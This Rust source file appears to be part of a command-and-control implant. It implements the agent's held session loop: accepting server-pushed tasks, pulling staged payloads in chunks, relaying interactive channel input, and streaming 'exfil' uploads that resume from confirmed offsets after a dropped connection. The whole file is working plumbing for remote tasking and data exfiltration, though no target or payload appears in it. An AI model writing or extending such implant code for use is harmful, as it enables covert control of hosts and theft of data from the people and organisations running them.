use prost::Message;

use crate::error::ContactError;
use crate::session::Session;
use crate::wire::{ChannelInput, ExfilProgress, Frame, FrameKind, StagedChunk, TaskRequest};

// The held live session, shared by the stream transports (architecture.md
// Sec 8): after the opening handshake exchange the server pushes tasking the
// moment it queues, each message its own frame batch, and the loop parks
// between messages -- blocking while no channel is live, ticking (the
// CHANNEL_TICK cadence) while one could have queued output, so its pumps
// never sit on an unflushed write. A carriage supplies the byte exchange;
// everything here is the session discipline both carriages run.

/// The channel tick while a live channel could have queued output.
pub(crate) const CHANNEL_TICK: std::time::Duration = std::time::Duration::from_millis(200);

/// The byte exchange one carriage supplies: write one batch's sealed body,
/// read the next message (or a tick), and arm or disarm the read tick.
pub(crate) trait LiveChannel {
    fn send_batch(&mut self, session: &mut Session, frames: &[Frame]) -> Result<(), ContactError>;

    /// Ok(Some(frames)) for one decoded message; Ok(None) for an idle tick
    /// (only read with the tick armed).
    fn recv(&mut self, session: &mut Session) -> Result<Option<Vec<Frame>>, ContactError>;

    /// Arm the short read timeout while a channel is live, disarm to park.
    fn arm_tick(&mut self, on: bool);
}

/// The held handshake arc both stream carriages run after their socket opens:
/// write the handshake, answer-refusal short-circuits, results whose delivery
/// may have died with an earlier connection ride first (the server records
/// first-wins), staged transfers left pending by a dropped connection
/// re-drive from their held seams (an acked task never redelivers), then the
/// held loop takes over the answer's remaining frames.
pub(crate) fn held_handshake(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    inbound: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    flush(channel, session)?;
    run_staged(session, channel)?;
    serve_held(session, channel, inbound, acks)?;
    serve_loop(session, channel, acks)
}

/// One message's held frames: channel input routes to the live channel it
/// names, a staged task registers its transfer and pulls inline (the
/// blocking exchange the held connection permits), an exfil seam report
/// moves its run's confirmed bytes, tasking is accepted and flushed the
/// moment it happens. Downstream frames discriminate on kind first -- the
/// positional tasking parse is for kindless frames alone.
pub(crate) fn serve_held(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    frames: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    for frame in frames {
        if frame.kind() == FrameKind::ChannelInput {
            if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if frame.kind() == FrameKind::ExfilProgress {
            if let Ok(progress) = ExfilProgress::decode(frame.payload.as_ref()) {
                session.exfil_progress(&progress.task_id, &progress.name, progress.held_bytes);
            }
            continue;
        }
        if frame.kind() != FrameKind::Unspecified {
            continue;
        }
        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
            let staged = task.staged_bytes.is_some();
            session.accept(&task, acks);
            if staged && session.staged_holds(&task.task_id) {
                // A verified staged task: pull the payload over this
                // connection before anything else -- the verb cannot run
                // without it, and the demand is answered inline.
                run_staged(session, channel)?;
            }
            flush(channel, session)?;
        }
    }
    Ok(())
}

/// The parked half of the session loop: channel output is drained and flushed
/// on every wake, and the park itself blocks while no channel is live and no
/// upload run is owed (nothing but the server's push can wake us) or ticks
/// while either is (a run keeps slicing; a channel could queue output).
pub(crate) fn serve_loop(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    acks: bool,
) -> Result<(), ContactError> {
    loop {
        session.drain_channels();
        flush(channel, session)?;
        channel.arm_tick(session.channels.any_live() || session.exfil_pending());
        if let Some(frames) = channel.recv(session)? {
            serve_held(session, channel, &frames, acks)?;
        }
    }
}

/// The staged arm on the held connection: every pending transfer demands at
/// its current seam and blocks on the messages until its terminal chunk --
/// nothing else interleaves on a blocking read. The held bytes live on the
/// session, so a connection that dies mid-run loses nothing: the reconnect
/// re-drives the transfers from what is held, and an acked staged task never
/// redelivers, so the drive is the carriage's own duty.
pub(crate) fn run_staged(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
) -> Result<(), ContactError> {
    while let Some(task_id) = session.staged_pending().first().cloned() {
        let demand = [session
            .staged_pull_frame(&task_id)
            .expect("the pending transfer builds its demand")];
        channel.send_batch(session, &demand)?;

        loop {
            // An idle tick while the payload parks is a tick, not a close: keep
            // waiting (the stream carriage's own staged arm waited the same way).
            let Some(frames) = channel.recv(session)? else {
                continue;
            };
            for frame in frames {
                // A seam report may interleave with the run (the writer
                // pushes it beside the staged chunks): route it, never let
                // it parse as a chunk.
                if frame.kind() == FrameKind::ExfilProgress {
                    if let Ok(progress) = ExfilProgress::decode(frame.payload.as_ref()) {
                        session.exfil_progress(
                            &progress.task_id,
                            &progress.name,
                            progress.held_bytes,
                        );
                    }
                    continue;
                }
                if frame.kind() != FrameKind::Unspecified {
                    continue;
                }
                if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
                    session.accept_staged_chunk(&chunk);
                }
            }
            if !session.staged_holds(&task_id) {
                break; // the terminal chunk dispatched the task
            }
        }
    }
    Ok(())
}

/// Writes whatever the session has queued since the last write, marking it
/// delivered: a batch that left the socket counts as delivered (the
/// wire-writing carriers' mark-on-write rule). The exfil run slices ride
/// their own message behind the batch -- regenerated from the confirmed
/// seam every flush, so a message that dies in flight re-sends from the
/// last seam the server reported (ADR-010's upload arm).
pub(crate) fn flush(
    channel: &mut dyn LiveChannel,
    session: &mut Session,
) -> Result<(), ContactError> {
    let batch = session.outbox.batch();
    if !batch.is_empty() {
        channel.send_batch(session, &batch)?;
        session.outbox.batch_crossed(batch.len());
    }
    let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
    if !exfil.is_empty() {
        channel.send_batch(session, &exfil)?;
    }
    Ok(())
}
